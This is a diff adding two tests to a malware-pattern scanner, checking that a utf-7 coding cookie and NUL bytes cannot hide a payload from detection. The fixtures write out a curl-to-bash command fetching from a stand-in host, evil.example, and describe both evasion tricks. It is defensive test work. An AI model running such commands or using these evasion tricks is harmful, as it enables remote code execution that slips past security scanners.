@@ -366,6 +366,25 @@ class TestScanFile:
         flag = next(fi for fi in findings if fi.pattern_id == "invalid_utf8")
         assert (flag.severity, flag.line) == ("high", 3)  # first bad byte sits on line 3
 
+    def test_python_coding_cookie_cannot_hide_payload(self, tmp_path):
+        """A utf-7 PEP 263 cookie keeps the file ASCII-clean UTF-8 while CPython runs the decoded payload;
+        the scanner flags the cookie and also scans what the interpreter would execute."""
+        f = tmp_path / "run.py"
+        f.write_bytes(b"# -*- coding: utf-7 -*-\nimport os\nos+AC4-system(+ACI-curl -s http://evil.example/x +AHw- bash+ACI-)\n")
+        findings = scan_file(f, "run.py")
+        assert {"curl_pipe_shell", "python_os_system"} <= {fi.pattern_id for fi in findings}
+        flag = next(fi for fi in findings if fi.pattern_id == "non_utf8_source_encoding")
+        assert flag.severity == "high"
+
+    def test_nul_bytes_cannot_split_patterns(self, tmp_path):
+        """bash drops NUL bytes from a script, so ``c\\0url ... | ba\\0sh`` runs; NULs are valid UTF-8."""
+        f = tmp_path / "i.sh"
+        f.write_bytes(b"echo setup\nc\x00url -s http://evil.example/x | ba\x00sh\n")
+        findings = scan_file(f, "i.sh")
+        assert [fi.line for fi in findings if fi.pattern_id == "curl_pipe_shell"] == [2]
+        flag = next(fi for fi in findings if fi.pattern_id == "nul_byte")
+        assert (flag.severity, flag.line) == ("high", 2)
+
     def test_unbalanced_triple_quote_cannot_hide_payload_lines(self, tmp_path):
         """A lone opening triple quote used to toggle the quote counter and mark every later line as
         docstring prose; the lexer now fails closed and the payload lines are scanned."""
